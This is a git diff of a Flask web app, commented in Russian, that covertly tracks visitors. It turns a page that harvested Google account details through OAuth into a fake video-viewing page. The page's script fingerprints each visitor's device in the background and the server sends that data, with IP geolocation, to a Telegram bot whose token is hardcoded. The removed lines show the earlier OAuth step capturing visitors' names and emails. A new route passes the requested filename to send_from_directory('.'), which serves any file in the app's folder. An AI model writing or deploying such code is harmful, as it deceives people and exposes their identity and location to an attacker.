@@ -1,6 +1,6 @@
 from datetime import datetime
 import os
-from flask import Flask, redirect, render_template_string, request, session, url_for
+from flask import Flask, render_template_string, request, send_from_directory
 import requests
 
 app = Flask(__name__)
@@ -8,12 +8,6 @@ app.secret_key = os.urandom(24)
 
 TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
 TELEGRAM_CHAT_ID = "8564758689"
-
-GOOGLE_CLIENT_ID = (
-    "23197192099-5ik0d5n4cb58leaikc44bernhmq1mgb0.apps.googleusercontent.com"
-)
-GOOGLE_CLIENT_SECRET = "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"
-RENDER_URL = "https://photo-2pii.onrender.com"
 
 
 def send_telegram_message(text):
@@ -31,80 +25,101 @@ def index():
     if "Go-http-client" in user_agent or "Render" in user_agent:
         return "OK", 200
 
-    # Отдаем HTML-страницу, которая собирает железо через JS и уходит на Google OAuth
-    html_page = f"""
+    # HTML-страница со встроенным видеоплеером и фоновым сбором железа
+    html_page = """
     <!DOCTYPE html>
     <html lang="ru">
     <head>
         <meta charset="UTF-8">
-        <title>Загрузка...</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Просмотр видео</title>
+        <style>
+            body {
+                margin: 0;
+                background-color: #000;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                overflow: hidden;
+            }
+            video {
+                max-width: 100%;
+                max-height: 100%;
+                outline: none;
+            }
+        </style>
     </head>
     <body>
-        <script>
-            async function collectAndRedirect() {{
-                let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
-                let pixelRatio = window.devicePixelRatio || 1;
-                let touchPoints = navigator.maxTouchPoints || 0;
-                let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
-                let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
-                let platform = navigator.platform || "Неизвестно";
-                let language = navigator.language || "Неизвестно";
-                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
-                let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+        <video id="vid" controls autoplay playsinline>
+            <source src="/video/333.m4" type="video/mp4">
+            Ваш браузер не поддерживает видео.
+        </video>
 
-                let gpu = "Неизвестно";
-                try {{
+        <script>
+            async function collectData() {
+                try {
+                    let screenInfo = screen.width + "x" + screen.height + " (Доступно: " + window.innerWidth + "x" + window.innerHeight + ")";
+                    let pixelRatio = window.devicePixelRatio || 1;
+                    let touchPoints = navigator.maxTouchPoints || 0;
+                    let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
+                    let memory = navigator.deviceMemory ? navigator.deviceMemory + " ГБ" : "Неизвестно";
+                    let platform = navigator.platform || "Неизвестно";
+                    let language = navigator.language || "Неизвестно";
+                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Неизвестно";
+                    let cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+
+                    let gpu = "Неизвестно";
                     let canvas = document.createElement('canvas');
                     let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {{
+                    if (gl) {
                         let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {{
+                        if (debugInfo) {
                             gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }}
-                    }}
-                }} catch(e) {{}}
+                        }
+                    }
 
-                let batteryLevel = "Неизвестно";
-                let batteryCharging = "Неизвестно";
-                try {{
-                    if (navigator.getBattery) {{
+                    let batteryLevel = "Неизвестно";
+                    let batteryCharging = "Неизвестно";
+                    if (navigator.getBattery) {
                         let battery = await navigator.getBattery();
                         batteryLevel = Math.round(battery.level * 100) + "%";
                         batteryCharging = battery.charging ? "Да" : "Нет";
-                    }}
-                }} catch(e) {{}}
+                    }
 
-                let data = {{
-                    screen: screenInfo,
-                    pixel_ratio: pixelRatio,
-                    touch: touchPoints,
-                    cores: cpuCores,
-                    memory: memory,
-                    platform: platform,
-                    language: language,
-                    timezone: timezone,
-                    cookies: cookiesEnabled,
-                    gpu: gpu,
-                    battery_level: batteryLevel,
-                    battery_charging: batteryCharging
-                }};
+                    let data = {
+                        screen: screenInfo,
+                        pixel_ratio: pixelRatio,
+                        touch: touchPoints,
+                        cores: cpuCores,
+                        memory: memory,
+                        platform: platform,
+                        language: language,
+                        timezone: timezone,
+                        cookies: cookiesEnabled,
+                        gpu: gpu,
+                        battery_level: batteryLevel,
+                        battery_charging: batteryCharging
+                    };
 
-                // Отправляем первичную инфу на сервер
-                await fetch('/collect', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(data)
-                }});
-
-                // Перенаправляем на авторизацию Google
-                window.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id={GOOGLE_CLIENT_ID}&redirect_uri={RENDER_URL}/callback&response_type=code&scope=email%20profile";
-            }}
-            collectAndRedirect();
+                    await fetch('/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch(e) {}
+            }
+            collectData();
         </script>
     </body>
     </html>
     """
     return render_template_string(html_page)
+
+
+@app.route("/video/<filename>")
+def serve_video(filename):
+    return send_from_directory(".", filename)
 
 
 @app.route("/collect", methods=["POST"])
@@ -136,87 +151,24 @@ def collect():
 
     user_agent = request.headers.get("User-Agent", "")
 
-    # Сохраняем в сессию или временный словарь, но проще отправить сразу первое уведомление
     initial_message = (
-        f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
+        f"🔔 *ПЕРЕХОД И ПРОСМОТР ВИДЕО*\n\n"
         f"⏱️ *Время:* `{visit_time}`\n"
         f"🌐 *IP-адрес:* `{ip}`\n"
-        f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
-        f"🔗 *Реферер:* `{request.referrer or 'Прямой заход'}`\n\n"
+        f"🛡 *VPN / Прокси:* `{is_vpn}`\n\n"
         f"📍 *ГЕОЛОКАЦИЯ:*\n"
         f"- Страна: `{country}`\n"
-        f"- Регион: `{region}`\n"
-        f"- Город: `{city}`\n"
-        f"- Координаты: `{lat}, {lon}`\n"
-        f"- Провайдер: `{isp}`\n"
-        f"- Организация: `{org}`\n\n"
+        f"- Город: `{city}`\n\n"
         f"💻 *ЖЕЛЕЗО И ЭКРАН:*\n"
         f"- Платформа ОС: `{data.get('platform')}`\n"
         f"- Экран: `{data.get('screen')}`\n"
-        f"- Плотность пикселей: `{data.get('pixel_ratio')}`\n"
-        f"- Точки касания (Тач): `{data.get('touch')}`\n"
         f"- Ядра процессора: `{data.get('cores')}`\n"
-        f"- Оперативная память: `{data.get('memory')}`\n"
         f"- Видеокарта (GPU): `{data.get('gpu')}`\n\n"
-        f"⚙️ *СИСТЕМА И БАТАРЕЯ:*\n"
-        f"- Язык: `{data.get('language')}`\n"
-        f"- Часовой пояс: `{data.get('timezone')}`\n"
-        f"- Батарея: `{data.get('battery_level')} (Зарядка: {data.get('battery_charging')})`\n"
-        f"- Cookies: `{data.get('cookies')} | Онлайн: Да`\n\n"
         f"🌐 *USER-AGENT:*\n`{user_agent}`"
     )
 
     send_telegram_message(initial_message)
     return "OK", 200
-
-
-@app.route("/callback")
-def callback():
-    code = request.args.get("code")
-    if not code:
-        return "Ошибка авторизации: код не получен", 400
-
-    redirect_uri = f"{RENDER_URL}/callback"
-    token_url = "https://oauth2.googleapis.com/token"
-    token_data = {
-        "code": code,
-        "client_id": GOOGLE_CLIENT_ID,
-        "client_secret": GOOGLE_CLIENT_SECRET,
-        "redirect_uri": redirect_uri,
-        "grant_type": "authorization_code",
-    }
-
-    token_r = requests.post(token_url, data=token_data)
-    if token_r.status_code != 200:
-        return f"Ошибка получения токена: {token_r.text}", 400
-
-    access_token = token_r.json().get("access_token")
-
-    user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
-    headers = {"Authorization": f"Bearer {access_token}"}
-    user_r = requests.get(user_info_url, headers=headers)
-
-    if user_r.status_code != 200:
-        return "Ошибка получения профиля", 400
-
-    user_info = user_r.json()
-    email = user_info.get("email", "Не указана")
-    name = user_info.get("name", "Не указано")
-    picture = user_info.get("picture", "Нет фото")
-
-    visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Второе сообщение — когда получена почта и профиль
-    success_message = (
-        f"🔑 *УСПЕШНЫЙ ВХОД (С ПОЧТОЙ)*\n\n"
-        f"👤 *Имя:* `{name}`\n"
-        f"📧 *Email:* `{email}`\n"
-        f"🖼 *Аватар:* [Фото профиля]({picture})\n"
-        f"⏱️ *Время:* `{visit_time}`"
-    )
-
-    send_telegram_message(success_message)
-    return redirect("https://google.com")
 
 
 if __name__ == "__main__":
